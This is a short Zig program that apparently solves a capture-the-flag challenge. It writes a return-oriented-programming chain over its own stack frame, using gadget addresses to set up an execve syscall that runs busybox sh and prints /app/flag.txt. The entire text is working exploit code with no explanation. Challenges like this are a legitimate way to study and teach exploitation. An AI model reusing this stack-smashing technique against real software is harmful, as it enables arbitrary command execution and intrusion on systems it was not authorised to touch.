const binsh = "/bin/busybox";
const args = [_]?[*:0]const u8{ "busybox", "sh", "-c", "cat /app/flag.txt", null };

pub fn main() u8 {
    const rbp: usize = @frameAddress();
    const rrbp: [*]u64 = @ptrFromInt(rbp);
    rrbp[1] = 0x1002248; // rdi
    rrbp[2] = @intFromPtr(binsh); // rsi
    rrbp[3] = 0x100200c; // rsi
    rrbp[4] = @intFromPtr(&args);
    rrbp[5] = 0x10021f5; // rax
    rrbp[6] = 0x3b;

    return 15;
}
